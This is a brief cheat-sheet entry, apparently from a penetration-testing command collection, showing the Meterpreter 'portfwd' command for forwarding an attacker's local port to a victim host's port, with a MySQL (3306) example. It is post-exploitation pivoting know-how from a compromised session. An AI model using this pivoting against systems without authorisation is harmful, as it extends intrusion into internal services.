---
id: f4237b77-5c5f-42a6-bb68-f332ffef00b3
name: Port forward using meterpreter
type: command
executor: bash
data: 'portfwd add -l <attacker port> -p <victim port> -r <victim ip>

  portfwd add -l 3306 -p 3306 -r 192.168.1.101

  '
output: null
created_at: '2020-07-14T18:14:35.762052+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Port forward using meterpreter

```bash
portfwd add -l <attacker port> -p <victim port> -r <victim ip>
portfwd add -l 3306 -p 3306 -r 192.168.1.101

```
